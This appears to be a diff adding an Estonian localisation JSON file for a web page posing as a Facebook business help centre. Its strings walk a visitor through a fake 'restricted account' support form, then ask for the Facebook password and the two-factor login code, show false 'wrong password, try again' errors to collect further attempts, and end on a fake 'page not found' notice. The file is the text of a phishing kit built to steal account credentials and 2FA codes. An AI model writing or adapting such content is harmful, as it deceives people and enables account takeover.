@@ -1,0 +1,59 @@
+{
+  "translation": {
+    "title": "Facebooki äriabikeskus",
+    "title2": "Müüa Facebooki kaudu",
+    "very_phone": "Palun sisesta kehtiv telefoninumber.",
+    "banner-content": "Keskuse agendi kaudu",
+    "description": "Kuidas saame teid aidata?",
+    "description2": "Kuidas saame aidata?",
+    "text": "Vajame teie probleemi lahendamiseks lisateavet. ",
+    "label": "Levinumad probleemid",
+    "btn": "Mul on funktsiooni kasutamine blokeeritud",
+    "btn1": "Minu konto on piiratud",
+    "btn2": "Minu fotod ja videod rikuvad eeskirju",
+    "btn3": "Minu sait on piiratud",
+    "btn4": "Pean oma konto kaitsma",
+    "btn5": "Muud probleemid",
+    "button": "Edasi",
+    "form-title": "Hankige abi",
+    "phone": "Telefoninumber",
+    "text-batbuoc": "nõuda",
+    "email": "E-posti aadress",
+    "form2-title2": "Jätkamiseks sisestage oma Facebooki parool",
+    "form2-content": "Peame kinnitama, et teabe saatja olete teie. Sisestage oma Facebooki parool ja jätkake.",
+    "password": "Parool",
+    "validate-true": "Kinnitage teave",
+    "chat_btn": "Alusta vestlust"
+  },
+  "frm_input1": {
+    "home_title": "Jätkamiseks sisestage oma Facebooki parool",
+    "modal__body-description": "Peame kinnitama, et teabe saatja olete teie. Sisestage oma Facebooki parool ja jätkake.",
+    "password": "Parool",
+    "btn_send_continue": "Jätka",
+    "validate-true": "Kinnitage teave",
+    "text-danger": "Server on hõivatud! ",
+    "text-danger1": "Parool on vale, proovige uuesti.",
+    "text-danger2": "Nõuab süsteemi ümbertegemist. ",
+    "input1": "Sisestage segadus edukalt"
+  },
+  "frm_input2": {
+    "home_title": "Jätkamiseks sisestage sisselogimiskood",
+    "description": "Teie kontol on lubatud kahefaktoriline autentimine, mis nõuab seda täiendavat sisselogimisetappi.",
+    "title": "Kinnitage teisest seadmest",
+    "description2": "Kontrollige Facebooki teatist, kus olete oma kontole sisse loginud, ja kinnitage jätkamiseks sisselogimine.",
+    "title2": "Või sisestage oma sisselogimiskood",
+    "description3": "Sisestage 6–8-kohaline kood oma telefonist või seadistatud autentimisrakendusest.",
+    "button": "Saada kood",
+    "validate-true": "Kinnitage teave",
+    "text-danger": "Server on hõivatud! ",
+    "text-danger1": "Parool on vale, proovige uuesti.",
+    "text-danger2": "Nõuab süsteemi ümbertegemist. ",
+    "button1": "Saada",
+    "placeholder": "Sisselogimiskood"
+  },
+  "notification": {
+    "text-danger1": "Autentimiskood on vale, proovige uuesti.",
+    "title": "Kahjuks seda lehte pole olemas,",
+    "title2": "Link, millele klõpsasite, võib olla katki või leht võib olla eemaldatud."
+  }
+}
